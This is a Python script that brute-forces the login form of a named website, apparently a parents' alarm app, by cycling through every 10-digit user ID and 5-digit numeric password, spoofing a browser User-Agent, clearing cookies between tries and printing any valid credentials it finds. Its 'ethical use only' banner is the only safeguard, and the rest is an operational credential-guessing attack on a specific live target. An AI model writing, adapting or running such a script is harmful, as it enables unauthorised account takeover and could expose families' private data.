import requests
import time

# Configuration
BASE_URL = "https://parentsalarmapp.com"
LOGIN_URL = f"{BASE_URL}/"
USER_FIELD = "LoginId"
PASS_FIELD = "LoginPassword"
SUBMIT_FIELD = "command"
SUBMIT_VALUE = "SIGN IN"

TIMEOUT = 15
REQUEST_DELAY = 0.2  # Adjust based on server tolerance
MAX_RETRIES = 3

# ID and Password ranges
ID_START = 1000000000
ID_END = 9999999999  # All 10-digit IDs
PASS_START = 11111
PASS_END = 99999  # All 5-digit passwords

def attempt_login(session, user_id, password):
    """Attempt login with given user ID and password"""
    for attempt in range(MAX_RETRIES):
        try:
            # Get login page to refresh session
            session.get(LOGIN_URL, timeout=TIMEOUT)

            # Prepare payload
            payload = {
                USER_FIELD: user_id,
                PASS_FIELD: password,
                SUBMIT_FIELD: SUBMIT_VALUE
            }

            # Send login request
            response = session.post(
                LOGIN_URL,
                data=payload,
                allow_redirects=True,
                timeout=TIMEOUT
            )

            # Check for successful login
            if "mobiledashboard" in response.url:
                return True
            return False

        except requests.RequestException as e:
            if attempt < MAX_RETRIES - 1:
                print(f"Retry {attempt+1}/{MAX_RETRIES} after error: {str(e)}")
                time.sleep(REQUEST_DELAY * 2)
            else:
                print(f"Network error: {str(e)}")
                return False

def main():
    print("Starting comprehensive ID and password test")
    print(f"Testing {ID_END - ID_START + 1:,} user IDs")
    print(f"Testing {PASS_END - PASS_START + 1:,} passwords per ID")
    total_combinations = (ID_END - ID_START + 1) * (PASS_END - PASS_START + 1)
    print(f"Total combinations: {total_combinations:,}")
    print(f"Estimated time: {total_combinations * REQUEST_DELAY / 3600:.2f} hours")
    print("=" * 60)

    # Initialize session
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    })

    found_credentials = []
    total_tested = 0

    for user_id in range(ID_START, ID_END + 1):
        user_id_str = str(user_id)
        user_found = False
        
        print(f"Testing User ID: {user_id_str}")

        for password in range(PASS_START, PASS_END + 1):
            password_str = str(password).zfill(5)
            session.cookies.clear()  # Clear cookies for each attempt

            # Attempt login
            success = attempt_login(session, user_id_str, password_str)
            total_tested += 1

            if success:
                found_credentials.append((user_id_str, password_str))
                print(f"SUCCESS - User ID: {user_id_str}, Password: {password_str}")
                user_found = True
                break
            else:
                # Only show failed attempts for the first few passwords to reduce noise
                if password <= PASS_START + 2:
                    print(f"   Password: {password_str} - FAILED")

            # Respect rate limit
            time.sleep(REQUEST_DELAY)

            # Progress update every 500 combinations
            if total_tested % 500 == 0:
                print(f"Progress: {total_tested:,}/{total_combinations:,} combinations tested")
                if found_credentials:
                    print(f"Found so far: {len(found_credentials)} valid credentials")

        # If no password found for this user ID, show brief message
        if not user_found:
            print(f"   No valid password for User ID: {user_id_str}")

        # Break early if we want to stop after finding some credentials
        # Remove or modify this condition as needed
        if len(found_credentials) >= 5:  # Stop after finding 5 valid credentials
            print("Stopping early - found 5 valid credentials")
            break

    print("=" * 60)
    print("TEST COMPLETED")
    print(f"Total combinations tested: {total_tested:,}")
    print(f"Valid credentials found: {len(found_credentials)}")
    
    if found_credentials:
        print("\nVALID CREDENTIALS:")
        for user_id, password in found_credentials:
            print(f"   User ID: {user_id}, Password: {password}")
    else:
        print("No valid credentials found")
    
    print("=" * 60)

if __name__ == "__main__":
    # Professional startup
    print("=" * 60)
    print("CREDENTIAL TESTING SCRIPT - ETHICAL USE ONLY")
    print(f"Target: {BASE_URL}")
    print("=" * 60)
    print("Requirements:")
    print("- You MUST have explicit permission to test this site")
    print("- Respect server resources (use adequate delays)")
    print("- This is a comprehensive test - consider the massive scale")
    print("=" * 60)
    
    # Warning about scale
    total_combinations = (ID_END - ID_START + 1) * (PASS_END - PASS_START + 1)
    estimated_hours = total_combinations * 0.2 / 3600
    
    print(f"SCALE WARNING:")
    print(f"   Total combinations: {total_combinations:,}")
    print(f"   Estimated time: {estimated_hours:.2f} hours ({estimated_hours/24:.2f} days)")
    print("=" * 60)
    print("Starting test in 3 seconds...")
    time.sleep(3)

    # Start the test
    main()